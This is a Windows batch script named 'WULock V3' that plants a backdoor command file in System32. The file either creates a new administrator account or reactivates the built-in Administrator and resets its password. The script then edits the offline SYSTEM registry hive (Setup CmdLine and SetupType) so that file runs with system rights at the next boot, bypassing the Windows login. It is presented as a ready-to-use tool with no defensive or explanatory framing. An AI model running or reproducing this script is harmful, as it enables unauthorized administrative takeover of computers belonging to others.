@echo off
::=============================================================::
:: WULock V3.0 Created by Networkk                             ::
:: DO NOT MODIFY UNLESS YOU KNOW WHAT YOU ARE DOING            ::
:: MODIFYING THIS FILE MAY CORRUPT YOUR OPERATING SYSTEM       ::
:: MODIFY AT YOUR OWN RISK                                     ::
::=============================================================::
echo WULock V3
echo Written by Networkk

echo Type 'create' to create a new admin account
echo Type 'reset' to activate and reset the default admin account
echo Type 'cancel' to exit this script'
:Options
set /p option=""
if %option%==create GOTO CreateFile else GOTO Options
if %option%==reset GOTO ResetAdmin else GOTO Options
if %option%==cancel GOTO END else GOTO Options

:CreateFile
echo @echo off > WULock.bat
echo username: 
set /p username=""
echo password: 
set /p password=""
echo created file
echo net user /add %username% %password% >> WULock.bat
echo net localgroup administrators %username% /add >> WULock.bat
echo cmd /k >> WULock.bat
move WULock.bat C:\Windows\System32 >nul
GOTO RegEdit

:ResetAdmin
echo @echo off > WULock.bat
echo net user Administrator /active:yes >> WULock.bat
echo net user Administrator * >> WULock.bat
echo cmd /k >> WULock.bat
move WULock.bat C:\Windows\System32 >nul
GOTO RegEdit

:RegEdit
reg.exe load HKLM\TempHive "C:\Windows\System32\config\SYSTEM" >nul
reg delete HKEY_LOCAL_MACHINE\TempHive\Setup /v CmdLine /f >nul
reg add HKEY_LOCAL_MACHINE\TempHive\Setup /v CmdLine /t Reg_Sz /d WULock.bat >nul
reg delete HKEY_LOCAL_MACHINE\TempHive\Setup /v SetupType /f >nul
reg add HKEY_LOCAL_MACHINE\TempHive\Setup /v SetupType /t REG_DWORD /d 2 >nul
reg.exe unload HKLM\TempHive >nul
echo finished
:END
cmd /k